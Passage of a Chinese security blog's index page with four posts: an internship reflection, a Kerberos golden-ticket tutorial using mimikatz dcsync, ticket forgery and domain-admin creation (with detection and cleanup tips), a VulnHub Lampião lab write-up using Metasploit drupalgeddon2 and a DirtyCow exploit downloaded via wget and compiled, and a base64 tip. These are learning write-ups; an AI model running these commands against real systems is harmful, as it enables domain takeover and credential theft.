    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/07/feeling-about-internship/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/07/feeling-about-internship/" class="post-title-link" itemprop="url">feeling about internship</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-07-07 18:14:40 / 修改时间：18:23:58" itemprop="dateCreated datePublished" datetime="2021-07-07T18:14:40+08:00">2021-07-07</time>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>127</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>听说，互联网公司兜兜转转的人很多</p>
<p>听说，我现在呆的地方是君哥和帅哥曾经呆过的地方</p>
<p>突然某日，他被挖了</p>
<p>突然今日，他 也要走了</p>
<p>无妨</p>
<p>江湖路远，来日再见</p>
<p>希望各位继续成长</p>
<p>我也在逐渐向大家看齐</p>
<p>希望等我长成与各位再见</p>
<p>那就熟悉奇安信的安全建设从零到一</p>
<p>那就熟悉各种原理及响应方式</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/05/%E9%87%91%E7%A5%A8/" class="post-title-link" itemprop="url">域渗透提权维权之金票</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-05 14:28:21" itemprop="dateCreated datePublished" datetime="2021-07-05T14:28:21+08:00">2021-07-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-14 10:44:36" itemprop="dateModified" datetime="2021-07-14T10:44:36+08:00">2021-07-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">域渗透</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.3k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>域内常用的两种攻击包括黄金票据Golden ticket和白银票据SILVER TICKET，本篇博客先来介绍一下金票</p>
<h1 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h1><table>
<thead>
<tr>
<th align="center">ROLE</th>
<th align="center">IP</th>
<th align="center">OS</th>
</tr>
</thead>
<tbody><tr>
<td align="center">DC域控</td>
<td align="center">10.xx.xx.xx</td>
<td align="center">2012</td>
</tr>
</tbody></table>
<p>条件：域名+域的SID+KRBTGT的NTLM-hash</p>
<h1 id="票据生成步骤："><a href="#票据生成步骤：" class="headerlink" title="票据生成步骤："></a>票据生成步骤：</h1><ol>
<li><p><strong>域名</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure></li>
<li><p><strong>域的SID值</strong>     </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsyns /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/2.png"></p>
<blockquote>
<p>SID：500代表管理员</p>
</blockquote>
</li>
<li><p><strong>域的KRBTGT账户NTLM-HASH</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsyns /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure></li>
<li><p><strong>伪造任意域管账号</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test password /add /domain</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="0x01-获取域SID及krbtgt的HTLM-hash"><a href="#0x01-获取域SID及krbtgt的HTLM-hash" class="headerlink" title="0x01.获取域SID及krbtgt的HTLM-hash"></a>0x01.获取域SID及krbtgt的HTLM-hash</h1><p>先在DC上新建一个实验用户swanq,此攻击都是基于在域控机子上的普通域内账户.即普通域内账户没有创建域管账户的权限或提升普通用户权限，而利用黄金票据可以做到</p>
<p>获取SID</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/1.jpg"></p>
<p>mimikatz获取域控SID及krbtgt的NTLMhash.可在域控或在登陆过域控账户的域成员上获取</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/3.png"></p>
<blockquote>
<p><strong>dcsync</strong></p>
<p>概述：mimikatz功能，可模拟DC域控并从DC中导出帐户密码的hash</p>
<p>详解：</p>
<ul>
<li><p>在dcsync出现之前，要想获得域用户的hash，必须得先登录域控+在域控上执行代码后才可以获得域用户的哈希。而mimikatz增加的dcsync功能，<strong>可以模仿域控从真实的域控当中请求数据</strong>。</p>
</li>
<li><p>dcsync特点在于不用登录服务器，就可以<strong>远程通过域数据同步复制的方式获得想要的用户口令。</strong></p>
</li>
</ul>
</blockquote>
<h1 id="0x02-伪造票据"><a href="#0x02-伪造票据" class="headerlink" title="0x02.伪造票据"></a>0x02.伪造票据</h1><p>在非域控的机子上，需要先清除本地票据缓存，但因此swanq用户刚创建且并未有其他服务需要票据，所以此处为空，不需要</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/12.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge   </span><br></pre></td></tr></table></figure>

<p>得到krbtgt hash后，用mimikatz的Kerberos::golden功能离线生成金票ticket.kiribi伪造TGT</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:swanq /domain:wlaq.com /sid:&#123;s<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-xxx</span>&#125;  /krbtgt:&#123;ntlm<span class="literal">-hash</span>&#125; /ticket:ticket.kiribi</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/4.png"></p>
<h1 id="0x03-票据利用"><a href="#0x03-票据利用" class="headerlink" title="0x03.票据利用"></a>0x03.票据利用</h1><p>查看本地保存的票据,确认无误</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/8.png"></p>
<p>或者klist也可</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/13.png"></p>
<p>将伪造的黄金票据导入内存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos::ptt ticket.kiribi</span><br></pre></td></tr></table></figure>

<p>此时可以直接将DC的C盘映射到本地h盘，进行访问，访问有两种方式：</p>
<p>其一</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/14.png"></p>
<p>其二</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/15.png"></p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/9.png"></p>
<p>入DC检查</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/16.png"></p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/17.png"></p>
<p>除了映射之外也可直接添加域管账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use username password &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure>

<p>入DC检查</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/10.png"></p>
<p>不过此域管账户并没有本地登录权限，还是需要加入administrator组</p>
<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/11.png"></p>
<h1 id="0x04-检测及清理"><a href="#0x04-检测及清理" class="headerlink" title="0x04.检测及清理"></a>0x04.检测及清理</h1><h2 id="检测："><a href="#检测：" class="headerlink" title="检测："></a>检测：</h2><ol>
<li>伪造自己是administrator，此时日志无法检测，但是可以检测是否在常用IP段出现。</li>
<li>用wireshark可以看到认证流程只有4769-&gt;4624</li>
</ol>
<h2 id="清理："><a href="#清理：" class="headerlink" title="清理："></a>清理：</h2><ol>
<li>即时修改krbtgt账号密码，且需修改两次以确保不保留密码历史记录</li>
<li>官方有重置密码的脚本，建议定期重置：<a target="_blank" rel="noopener" href="https://github.com/microsoft/New-KrbtgtKeys.ps1">https://github.com/microsoft/New-KrbtgtKeys.ps1</a></li>
</ol>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><ol>
<li>正常的认证访问服务触发事件顺序为:<strong>4768（TGT）-4769（TGS）-4624（logon）</strong></li>
<li>mimikatz在win2003及以下导入黄金票据报错</li>
<li>事件4624-登录</li>
<li>事件4672-特殊登录：SYSTEM（本地系统）帐户的每次登录都会触发此事件,属正常事件</li>
<li>eventvwr打开windows事件查看器</li>
</ol>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li>chz-大佬竟在我身边：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/385465988">https://zhuanlan.zhihu.com/p/385465988</a></li>
<li>域控是最高级，域管是任何被域控加入域管的域成员</li>
<li>新建域用户之后，需要给域用户配置隶属于管理员的权限，才允许本地登录：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43760829/article/details/89437363">https://blog.csdn.net/weixin_43760829/article/details/89437363</a></li>
<li>远程桌面命令行指令：mstsc(Microsoft Terminal Server Connection)</li>
<li>需要熟悉Active Directory 用户和计算机、组策略管理</li>
<li><a target="_blank" rel="noopener" href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E5%93%88%E5%B8%8C">https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E5%93%88%E5%B8%8C</a></li>
<li>存在错误但为主要参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></li>
<li>mimikatz详情：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html">https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=f6SleGakcE0">https://www.youtube.com/watch?v=f6SleGakcE0</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/02/vulnHub-Lampiao/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/02/vulnHub-Lampiao/" class="post-title-link" itemprop="url">vulnHub靶机系列：shentouLampiao渗透Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-02 18:13:58" itemprop="dateCreated datePublished" datetime="2021-07-02T18:13:58+08:00">2021-07-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-14 10:45:40" itemprop="dateModified" datetime="2021-07-14T10:45:40+08:00">2021-07-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9D%B6%E6%9C%BAVulhub/" itemprop="url" rel="index"><span itemprop="name">靶机Vulhub</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>Would you like to keep hacking in your own lab?</p>
<p>Try this brand new vulnerable machine! “Lampião 1”.</p>
<p>Get root!</p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本靶场目标：获取root权限</p>
<h1 id="0x01-靶机环境"><a href="#0x01-靶机环境" class="headerlink" title="0x01 靶机环境"></a>0x01 靶机环境</h1><p>靶机：GoldenEye 192.168.221.136</p>
<p>攻击机：kali 192.168.221.130</p>
<h1 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h1><h2 id="获取目标IP"><a href="#获取目标IP" class="headerlink" title="获取目标IP"></a>获取目标IP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.221.0/24</span><br></pre></td></tr></table></figure>



<h2 id="服务扫描及信息收集"><a href="#服务扫描及信息收集" class="headerlink" title="服务扫描及信息收集"></a>服务扫描及信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -vv -p 1-65535 192.168.221.136</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/02/vulnHub-Lampiao/1.png"></p>
<p>22：ssh</p>
<p>80</p>
<p>1898：apache 2.4.7，此服务识别不了，直接返回数据</p>
<h1 id="0x03-漏洞探测及利用"><a href="#0x03-漏洞探测及利用" class="headerlink" title="0x03 漏洞探测及利用"></a>0x03 漏洞探测及利用</h1><p>访问1898端口为用户登录页面。dirb扫1898服务所有目录，发现敏感目录robots.txt</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/2.png"></p>
<p>robots.txt中记录了网站日志更改记录文件</p>
<h2 id="durpal"><a href="#durpal" class="headerlink" title="durpal"></a>durpal</h2><p>用durpal7的cms建站</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search dupral</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.221.136</span><br><span class="line"><span class="built_in">set</span> rport 1898</span><br><span class="line">exploit</span><br><span class="line"><span class="comment"># 直接拿下shell </span></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>

<p>但www-data权限较低</p>
<p>切换到/bin/bash目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以看到home路径下，<strong>用户名为tiago</strong></p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>网站一般有数据库的配置文件，在/var/www/html/sites/下有setting.php中写了数据库的用户名和密码</p>
<p>用户名：drupaluser</p>
<p>密码：Virgulino</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/database.png"></p>
<p>在users表中发现name和password。密码一般为md5加密，但并未查出来</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/users2.png"></p>
<h2 id="SSH访问服务器"><a href="#SSH访问服务器" class="headerlink" title="SSH访问服务器"></a>SSH访问服务器</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tiago@192.168.221.136</span><br></pre></td></tr></table></figure>

<p>以tiago身份登录服务器成功</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看靶机内核</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>考虑用16年的dirtycow提取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search </span><br><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40847.cpp &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/02/vulnHub-Lampiao/8.png"></p>
<p>靶机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget  http:&#x2F;&#x2F;192.168.221.130&#x2F;40847.cpp</span><br><span class="line">chmod 777 40847.cpp</span><br><span class="line"></span><br><span class="line">g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">.&#x2F;dcow -s</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数解释：</p>
<ol>
<li>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告</li>
<li>-pedantic 允许发出ANSI/ISO C标准所列出的所有警告</li>
<li>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高</li>
<li>-std=c++11就是用按C++2011标准来编译的</li>
<li>-pthread 在Linux中要用到多线程时，需要链接pthread库</li>
<li>-o dcow gcc生成的目标文件,名字为dcow</li>
</ol>
</blockquote>
<p><img src="/2021/07/02/vulnHub-Lampiao/12.png"></p>
<p>拿到flag</p>
<p><img src="/2021/07/02/vulnHub-Lampiao/13.png"></p>
<h1 id="0x04-复盘"><a href="#0x04-复盘" class="headerlink" title="0x04 复盘"></a>0x04 复盘</h1><ul>
<li>其实一般流程就是信息收集：</li>
<li><ol>
<li>端口 服务，再者是网站的目录，获取普通权限。</li>
<li>获取使用的CMS或者中间件，去查找其对应的漏洞，然后上传exp，编译执行拿到一定权限。</li>
<li>进入bin/bash。查找网站配置文件，寻找数据库用户名密码登录拖库。</li>
<li>亦或者是ssh连接，然后用提权EXP进行提权，最终拿到root权限</li>
</ol>
</li>
<li>远程bash的上下左右键或者delete键键入会产生很奇怪的符号，敲代码的时候就很难受</li>
<li>脏牛提权脚本中有其如何执行的注释，之后的EXP记得看</li>
</ul>
<h1 id="0x05-todolist"><a href="#0x05-todolist" class="headerlink" title="0x05 todolist"></a>0x05 todolist</h1><ol>
<li>dirtycow漏洞具体原理</li>
<li>dupal漏洞的具体原理</li>
</ol>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></li>
<li>文章参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ce319b350885?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation">https://www.jianshu.com/p/ce319b350885?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/01/base-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/01/base-64/" class="post-title-link" itemprop="url">base64解决terminal之间编码不同的问题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-07-01 18:03:11 / 修改时间：22:36:15" itemprop="dateCreated datePublished" datetime="2021-07-01T18:03:11+08:00">2021-07-01</time>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>487</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有些特殊字符没法以可打印字符的形式打印出来复制时，先编码一下，与url编码的原理相同</p>
<h1 id="使用及总结"><a href="#使用及总结" class="headerlink" title="使用及总结"></a>使用及总结</h1><p>使用：</p>
<p><img src="/2021/07/01/base-64/1.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@192: echo swanq &gt; 1</span><br><span class="line">root@192: echo circle &gt; 2</span><br><span class="line"></span><br><span class="line">root@192: diff -u 1 2 | base64 &gt; patch</span><br><span class="line"></span><br><span class="line">root@192: cat patch</span><br><span class="line">LS0tIDEJMjAyMS0wNy0wMSAyMjoyNDoxNy4wNzc3Mjc0MTAgKzA4MDAKKysrIDIJMjAyMS0wNy0wMSAyMjoyNDoyMy43OTc3Mjc2NzQgKzA4MDAKQEAgLTEgKzEgQEAKLXN3YW5xCitjaXJjbGUK</span><br><span class="line"></span><br><span class="line">root@192:&#x2F;home&#x2F;file# cat patch| base64 -d</span><br><span class="line">--- 1   2021-07-01 22:24:17.077727410 +0800</span><br><span class="line">+++ 2   2021-07-01 22:24:23.797727674 +0800</span><br><span class="line">@@ -1 +1 @@</span><br><span class="line">-swanq</span><br><span class="line">+circle</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/01/base-64/2.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以为base64会有什么神奇的功能，好吧，是我想多了…</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="swanQ"
      src="/images/author.jpg">
  <p class="site-author-name" itemprop="name">swanQ</p>
  <div class="site-description" itemprop="description">让自己去触碰安全的blue sky</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">29</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">59</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
    聊天
  </a>
  </div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="mailto:zhuoma.swanq@foxmail.com" title="E-Mail → mailto:zhuoma.swanq@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">swanQ</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">84k</span>
    <span class="post-meta-divider">|</span>
